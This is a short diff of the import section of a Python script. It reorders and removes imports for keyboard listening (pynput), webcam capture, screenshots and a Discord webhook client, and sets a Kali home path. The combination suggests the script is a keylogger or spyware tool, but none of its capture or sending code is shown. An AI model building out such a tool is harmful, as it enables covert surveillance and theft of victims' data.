@@ -1,17 +1,14 @@
 import socket
 import platform
 import logging
-from pynput.keyboard import Key, Listener
-from pynput import keyboard
 import pynput
+from pynput.keyboard import Key, Listener
 import time
 import os
-import datetime
 import pygame
 import pygame.camera
 from dhooks import Webhook
 import pyautogui
-
 
 system_info = "systeminfo.txt"
 file_path = "/home/kali" # Change this
